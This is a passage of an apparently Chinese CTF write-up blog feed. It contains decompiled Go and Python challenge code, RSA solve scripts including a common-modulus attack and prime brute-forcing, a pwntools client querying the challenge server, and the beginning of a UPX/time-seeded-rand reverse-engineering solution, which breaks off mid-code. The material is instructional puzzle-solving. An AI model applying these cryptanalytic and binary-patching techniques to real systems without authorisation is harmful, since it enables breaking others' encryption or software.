class="line">      v6,</span><br><span class="line">      v57,</span><br><span class="line">      v58,</span><br><span class="line">      v59,</span><br><span class="line">      v60,</span><br><span class="line">      v61);</span><br><span class="line">    v23 = snake_pkg_game_All_rand;</span><br><span class="line">    v71 = snake_pkg_game_All_rand;</span><br><span class="line">    v24 = qword_569E78;</span><br><span class="line">    v67 = qword_569E78;</span><br><span class="line">    v25 = <span class="number">0LL</span>;</span><br><span class="line">    v26 = <span class="number">0LL</span>;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v25 &lt; v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      v66 = v25;</span><br><span class="line">      v64 = v26;</span><br><span class="line">      v70 = v27;</span><br><span class="line">      v28 = *(_QWORD *)(v23 + <span class="number">8</span> * v25);</span><br><span class="line">      v75 = v8;</span><br><span class="line">      v29 = runtime_convT64(v28, v27, v28, v18, v19, v24, v20, v21, v22, v57);</span><br><span class="line">      *(_QWORD *)&amp;v75 = &amp;RTYPE_int;</span><br><span class="line">      *((_QWORD *)&amp;v75 + <span class="number">1</span>) = v29;</span><br><span class="line">      v18 = fmt_Sprintf((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;%02x&quot;</span>, <span class="number">4</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v75, <span class="number">1</span>, <span class="number">1</span>, v30, v31, v32, v33, v57, v58, v59, v60, v61);</span><br><span class="line">      v34 = v70;</span><br><span class="line">      v39 = runtime_concatstring2(<span class="number">0</span>, v70, v64, v18, <span class="number">4</span>, v35, v36, v37, v38, v57, v58, v59, v60, v61);</span><br><span class="line">      v23 = v71;</span><br><span class="line">      v24 = v67;</span><br><span class="line">      v19 = v39;</span><br><span class="line">      v25 = v66 + <span class="number">1</span>;</span><br><span class="line">      v26 = v34;</span><br><span class="line">      v27 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_OWORD *)v69.h = v8;</span><br><span class="line">    v40 = &amp;v57 + <span class="number">12</span>;</span><br><span class="line">    v56 = &amp;v76;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(__int64 *))loc_45F36B)(v40);</span><br><span class="line">    *(_QWORD *)v69.h = <span class="number">0xEFCDAB8967452301</span>LL;</span><br><span class="line">    *(_QWORD *)&amp;v69.h[<span class="number">2</span>] = <span class="number">0x1032547698BADCFE</span>LL;</span><br><span class="line">    v69.h[<span class="number">4</span>] = <span class="number">-1009589776</span>;</span><br><span class="line">    *(_OWORD *)&amp;v69.nx = v8;</span><br><span class="line">    v46 = (uint8 *)runtime_stringtoslicebyte(</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v68,</span><br><span class="line">                     v27,</span><br><span class="line">                     v41,</span><br><span class="line">                     (_DWORD)v40,</span><br><span class="line">                     v19,</span><br><span class="line">                     v42,</span><br><span class="line">                     v43,</span><br><span class="line">                     v44,</span><br><span class="line">                     v45,</span><br><span class="line">                     v57,</span><br><span class="line">                     v58,</span><br><span class="line">                     v59);</span><br><span class="line">    v77.cap = v47;</span><br><span class="line">    v77.len = v27;</span><br><span class="line">    v77.ptr = v46;</span><br><span class="line">    crypto_sha1__ptr_digest_Write(&amp;v69, v77);</span><br><span class="line">    v77.ptr = <span class="number">0LL</span>;</span><br><span class="line">    v77.len = <span class="number">0LL</span>;</span><br><span class="line">    v77.cap = <span class="number">0LL</span>;</span><br><span class="line">    v77 = crypto_sha1__ptr_digest_Sum(&amp;v69, v77);</span><br><span class="line">    v72 = v8;</span><br><span class="line">    v53 = runtime_convTslice(v48, v77.ptr, v77.len, <span class="number">0</span>, v19, v49, v50, v51, v52, v57, v58, v59);</span><br><span class="line">    *(_QWORD *)&amp;v72 = &amp;RTYPE__slice_uint8;</span><br><span class="line">    *((_QWORD *)&amp;v72 + <span class="number">1</span>) = v53;</span><br><span class="line">    fmt_Fprintf(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)go_itab__os_File_io_Writer,</span><br><span class="line">      os_Stdout,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;flag&#123;%x&#125;\n&quot;</span>,</span><br><span class="line">      <span class="number">9</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v72,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      v54,</span><br><span class="line">      v55,</span><br><span class="line">      v57,</span><br><span class="line">      v58,</span><br><span class="line">      v59,</span><br><span class="line">      v60,</span><br><span class="line">      v61,</span><br><span class="line">      v62,</span><br><span class="line">      v63);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>根据汇编，化简逻辑是</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断i <span class="operator">=</span><span class="operator">=</span> <span class="number">10</span></span><br><span class="line">不是 再来一轮</span><br><span class="line">是   判断qword_569E78 <span class="operator">=</span><span class="operator">=</span> <span class="number">400</span></span><br><span class="line">不是  结束</span><br><span class="line">是    输出flag</span><br></pre></td></tr></table></figure><p>以及网上有人说flag是根据输入变换的，但是我动态调试的时候试过不同的发现flag都一样，不过这个代码太抽象我也不知道flag怎么打出来的</p><p>最后就是在第一个判断0A的位置下断点，不断改变标志位，让程序到达输出success的位置，最后调用printf</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;da39a3ee5e6b4b0d3255bfef95601890afd80709&#125;</span></span><br></pre></td></tr></table></figure><h3 id="can-can-need-pxory">can_can_need_pxory</h3><p>这个题完全不能理解（现在也是）</p><p>是py转exe，先反编译出pyc，然后再反编译成py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ccccccccccccccccccccccccccccccccccc!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;D0 U know C?&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n#include &lt;NSSCTF.h&gt;\nv01d bnssst(int FTC[], int lenggggggg) &#123;\n    int i, j, SSN;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;This is CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;6L+Z5piv5L2g6KaB55qEZmxhZ+WQl++8nwpOU1NDVEZ7YjVlMzlkMDktODg3Yy1hZGI0LTE4OWMtMWI0OGEwNWJmOTY2fQ==&#x27;</span>)</span><br><span class="line">A = &#123;</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;NSSCTF&#123;a81c0d5e-ec6d-2b80&#x27;</span> &#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n                SSN = FTC[j];\n                printf(&quot;flag&quot;);\n            &#125;\n&#125;\nint mian() &#123;\n    int FTC[] = [ -,\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ccccccccccccccccccc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nb, 2, 6, 7, -, d, 5, 8, 4, -, 6, 8, 7, 4, -, f, 1, 2, 6, e, 3, a, 5, 1, 0, 6, 1, &#125;];\n    int lenggggggg = (int) sizeof(FTC) / sizeof(*FTC);\n    bnsScrt(FTC, lenggggggg);\n    int i;\n    for (i = 0; i &lt; lenggggggg; i++)\n        printf(&quot;%d &quot;, FTC[i]);\n    remake 0;\n&#125;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = <span class="string">&#x27;************************************&#x27;</span></span><br><span class="line">r = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (x + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        res = <span class="built_in">str</span>(<span class="built_in">ord</span>(flag[x]) ^ <span class="number">2421</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="built_in">str</span>(<span class="built_in">ord</span>(flag[x]) &lt;&lt; <span class="number">6</span> &lt;&lt; <span class="number">7</span> &gt;&gt; <span class="number">2</span> &gt;&gt; <span class="number">1</span> ^ <span class="number">92</span>)</span><br><span class="line">    r = r + res + <span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(base64.b16encode(base64.b32encode(r.encode(<span class="string">&#x27;utf-8&#x27;</span>)))).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p>上面print出来的东西好像是一段c语言代码，但是语法很抽象，就算改完语法的错，我也不理解ccccccccc是啥玩意，根据后面正常的py语法，怀疑c代码是给最后的末值的，</p><p>之后有机会补</p><h2 id="CRYPTO">CRYPTO</h2><h3 id="Level-1">Level_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">e1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">e2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = e1 * e2</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="built_in">print</span>(e1)</span><br><span class="line"><span class="built_in">print</span>(e2)</span><br></pre></td></tr></table></figure><p>这里已知n，c1，c2，e1，e2，把e1，e2看成p，q</p><p>那么可以根据$c_1 = m^p \mod n$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">22517647586235353449147432825948355885962082318127038138351524894369583539246623545565501496312996556897362735789505076324197072008392656511657262430676945685471397862981216472634785622155317188784494912316440866051402627470561626691472280850273482836308002341429493460677206562201947000047718275995355772707947408688836667011206588727438261189233517003341094758634490421007907582147392858070623641389171229435187248184443645883661560636995548332475573072064240073037558031928639832259001407585962782698021735648128101459118863015844905452823095147248865104102562991382119836061161756978764495337874807458182581421229</span></span><br><span class="line">c1 = <span class="number">1432393096266401187029059077791766305797845826173887492889260179348416733820890797101745501984437201566364579129066414005659742104885321270122634155922766503333859812540068278962999824043206496595825886026095484801291802992082454776271149083516187121160475839108002133113254134626407840182541809478892306748590016896975053434021666376203540725254480252049443975835307793528287818262102688334515632062552114342619781840154202525919769192765621085008206581226486157149883898548933475155236509073675387541466324512294079413938239828341890576923100769181401944289365386552139418728492565319685207500539721582552448971814</span></span><br><span class="line">c2 = <span class="number">13299679392897297864252207869444022461237574801991239380909482153705185317634241850084078027230394830079554676426505967970943836811048777462696506309466535820372917756458083553031417406403895116557560548183674144457502601887632495739472178857537011190162283185735114683172731936834993707871636782206418680404006299140864001776588991141011500807549645227520128216130966268810165946959810884593793452437010902774726405217517557763322690215690606067996057037379898630878638483268362526985225092000670251641184960698506349245915816808028210142606700394584541282682338561482561343076218115042099753144875658666459825545602</span></span><br><span class="line">e1 = <span class="number">155861690390761931560700906834977917646203451142415617638229284868013723431003139974975998354830978765979365632120896717380895021936387027045347260400512396388028781862427862974453223157509702913026222541667006325100878113871620322023188372501930117363623076837619478555007555970810681502521309925774889678793</span></span><br><span class="line">e2 = <span class="number">144471983652821947847253052623701746810204736865723159569786739658583884214397562204788127484897909964898113250509653721265240138487697822089282456150238116811225975640330930854549232972314642221382625614304415750165289831040623741828600283778523993251940904896081111235859249916040849697146542311990869696453</span></span><br><span class="line"></span><br><span class="line">phi = (e1-<span class="number">1</span>)*(e2-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e1,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;NSSCTF&#123;Y0u_Hav3_S01v3d_Crypt0_Leve1_i&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>这就是标准的RSA解密流程</p><p>也可以用共模攻击</p><blockquote><p>共模是指：就是明文m,相同。用两个公钥e1,e2加密得到两个私钥d1,d2 和两个密文c1,c2（e不同，n同）<br>共模攻击，即当m不变的情况下，知道n,e1,e2,c1,c2, 可以在不知道d1,d2的情况下，解出m<br>利用条件为=&gt; gcd(e1,e2)=1</p></blockquote><p>若两个e互素，gcd(e1,e2)=1</p><p>那么一定存在x，y使得gcd(a,b) = ax+by</p><p>所以$e_1s_1+e_2s_2=1$</p><p>根据复杂的推导过程最后得到：</p><p>(c1^s1*c2^s2)%n=m%n=m</p><p>即：m = (pow(c_1,s_1,n)*pow(c_2,s_2,n)) % n</p><p>所以另一个方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">155861690390761931560700906834977917646203451142415617638229284868013723431003139974975998354830978765979365632120896717380895021936387027045347260400512396388028781862427862974453223157509702913026222541667006325100878113871620322023188372501930117363623076837619478555007555970810681502521309925774889678793</span></span><br><span class="line">e2 = <span class="number">144471983652821947847253052623701746810204736865723159569786739658583884214397562204788127484897909964898113250509653721265240138487697822089282456150238116811225975640330930854549232972314642221382625614304415750165289831040623741828600283778523993251940904896081111235859249916040849697146542311990869696453</span></span><br><span class="line">n = <span class="number">22517647586235353449147432825948355885962082318127038138351524894369583539246623545565501496312996556897362735789505076324197072008392656511657262430676945685471397862981216472634785622155317188784494912316440866051402627470561626691472280850273482836308002341429493460677206562201947000047718275995355772707947408688836667011206588727438261189233517003341094758634490421007907582147392858070623641389171229435187248184443645883661560636995548332475573072064240073037558031928639832259001407585962782698021735648128101459118863015844905452823095147248865104102562991382119836061161756978764495337874807458182581421229</span></span><br><span class="line">c1 = <span class="number">1432393096266401187029059077791766305797845826173887492889260179348416733820890797101745501984437201566364579129066414005659742104885321270122634155922766503333859812540068278962999824043206496595825886026095484801291802992082454776271149083516187121160475839108002133113254134626407840182541809478892306748590016896975053434021666376203540725254480252049443975835307793528287818262102688334515632062552114342619781840154202525919769192765621085008206581226486157149883898548933475155236509073675387541466324512294079413938239828341890576923100769181401944289365386552139418728492565319685207500539721582552448971814</span></span><br><span class="line">c2 = <span class="number">13299679392897297864252207869444022461237574801991239380909482153705185317634241850084078027230394830079554676426505967970943836811048777462696506309466535820372917756458083553031417406403895116557560548183674144457502601887632495739472178857537011190162283185735114683172731936834993707871636782206418680404006299140864001776588991141011500807549645227520128216130966268810165946959810884593793452437010902774726405217517557763322690215690606067996057037379898630878638483268362526985225092000670251641184960698506349245915816808028210142606700394584541282682338561482561343076218115042099753144875658666459825545602</span></span><br><span class="line"></span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="Level-2">Level_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 猜猜我是谁 猜对了直接秒出flag喔</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">p = ***</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c=<span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>根据提示说e很常见，盲猜65537</p><p>p的取值在ps.txt文件中，遍历p直接求出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">q=<span class="number">145721736470529261146573065574028992352505611489859183763269215489708531333597694809923949026781460438320576519639268582565188719134157402292313959218961804213310847081787824780075530751842057663327444602428455144829447776271394663729996984613471623158126083062443634493708467568220146024273763894704649472957</span></span><br><span class="line">c=<span class="number">17441814714407189483380175736850663249578989775568187792928771544069162420510939242665830363276698262009780462912108642025299275146709817979705069095332726251759039923303627023610865046363171692163473939115438686877494878334016463787558794121885354719336139401336137097548305393030069499625065664884238710759260231321106291200849044147840392021931720902340003746946851806025722944795391356835342258387797980787437188976704677008092850181043891802072500430200735973581081228711070923822341261809453662427341958883142789220800541626034573952425948295446202775198692920613709157662831071515700549093766182579873408465779</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ps.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ps = [<span class="built_in">int</span>(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e,phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = long_to_bytes(m).decode()</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="Level-3">Level_3</h3><p>当时没做出来，后来发现nc的时候应该输ip 空格 端口 而不是ip:端口</p><p>就很亏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">n,e1,e2,c1,c2</span>):</span><br><span class="line">t = gmpy2.gcd(e1,e2)</span><br><span class="line"><span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">s,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">m = (<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">s,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">m = gmpy2.iroot((<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n)+k*n)%n,t)</span><br><span class="line"><span class="keyword">if</span> m[<span class="number">1</span>]:</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;IP&quot;</span>,端口号)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里需要666次，试了试665次打不出来</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">666</span>):</span><br><span class="line">data = sh.recvuntil(<span class="string">b&quot; y0u J01n In th3 NSS t3am?\n py?\n&quot;</span>)</span><br><span class="line">n = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">e1 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">e2 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">c1 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">c2 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag = decode(n,e1,e2,c1,c2)</span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;[+] Pl Give Me flaag :&quot;</span>,flag)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#转自https://www.cnblogs.com/mumuhhh/p/17993151#top</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋杯2023冬 复现</title>
      <link href="/posts/64aac72c.html"/>
      <url>/posts/64aac72c.html</url>
      
        <content type="html"><![CDATA[<h2 id="re">re</h2><h3 id="upx2023">upx2023</h3><p>先脱upx壳，这是修改了标志，用010editor把upx修改成UPX然后用upx -d脱壳</p><p>进入主函数后，发现逻辑大概是</p><ol><li>读flag</li><li>变换flag</li><li>用随机数异或flag加密</li><li>和check数组检验</li></ol><p>那么可以直接拿到check数组<br>我们要找flag就要找到那个随机数，srand函数传入的是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Seed = time(<span class="number">0</span>i64);</span><br><span class="line">srand(Seed);</span><br></pre></td></tr></table></figure><p>同时动态调试可以得到：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">变成</span></span><br><span class="line"><span class="language-xml">f</span><span class="template-variable">&#123;37BFGNRVZlg02468ACEGIKMOQSUWY&#125;</span><span class="language-xml">a159DHLPTX</span></span><br></pre></td></tr></table></figure><p>因此我们可以找时间遍历，遍历去年的时间戳</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">/*unsigned int seed = time(0);</span></span><br><span class="line"><span class="comment">srand(seed);</span></span><br><span class="line"><span class="comment">cout &lt;&lt; &#x27;[&#x27;;</span></span><br><span class="line"><span class="comment">for (int i = 0; i &lt; 42; i++) &#123;</span></span><br><span class="line"><span class="comment">int r = rand() % 255;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; r;</span></span><br><span class="line"><span class="comment">if (i != 41) &#123;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; &#x27;,&#x27;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; &#x27;]&#x27;;*/</span></span><br><span class="line"><span class="type">int</span> 